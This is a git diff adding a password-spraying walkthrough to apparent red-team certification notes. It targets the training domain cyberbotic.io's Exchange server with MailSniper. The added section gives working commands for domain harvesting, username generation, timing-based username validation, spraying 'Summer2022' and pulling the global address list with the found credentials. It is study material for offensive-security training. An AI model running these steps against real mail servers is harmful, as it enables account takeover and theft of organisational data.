@@ -218,38 +218,54 @@ site:apple.com -www -support
 This will return pages indexed on apple.com excluding the www and support domains.  Useful for finding other subdomains.
 
 
-### Social Media
 
+# Initial Compromise
+### Password Spraying
+-    Methodology: `Enum NetBIOS of the Domain` > `Find usernames` > `` > `` >
+1. [MailSniper](https://github.com/dafthack/MailSniper) is an excellent tool for password spraying against Offce 365. On the Attacker Desktop VM, open PowerShell and import MailSniper.ps1.
+```
+PS C:\Users\Attacker> ipmo C:\Tools\MailSniper\MailSniper.ps1
+```
+2. Enumerate the NetBIOS name of the target domain with `Invoke-DomainHarvestOWA`.
+```
+PS C:\Users\Attacker> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
+[*] Harvesting domain name from the server at mail.cyberbotic.io
+The domain appears to be: CYBER or cyberbotic.io
+```
+3. find valid usernames from [cyberbotic](https://cyberbotic.io)
+```
+ubuntu@DESKTOP-3BSK7NO ~> cd /mnt/c/Users/Attacker/Desktop/
+ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> cat names.txt
+Bob Farmer
+Isabel Yates
+John King
+Joyce Adams
+```
+4. find possible usernames from the username list using [namemash.py](https://gist.github.com/superkojiman/11076951)
+```
+ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> ~/namemash.py names.txt > possible.txt
+ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> head -n 5 possible.txt
+bobfarmer
+farmerbob
+bob.farmer
+farmer.bob
+farmerb
+```
+5. `Invoke-UsernameHarvestOWA` uses a timing attack to validate which (if any) of these usernames are valid.
+```
+PS C:\Users\Attacker> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
+```
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/e0c555f5-e30c-44ab-af67-de1d470b40a0)
 
+6. MailSniper can spray passwords against the valid account(s) identified using, Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).
+```
+PS C:\Users\Attacker> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
+```
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/fa9661d0-7863-401f-a27b-288bb62c6042)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+7. We can do further actions using MailSniper with valid credentials, such as downloading the global address list.
+```
+PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
+```
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/46008966-f8eb-4313-bae7-20239a9d2ff2)
 
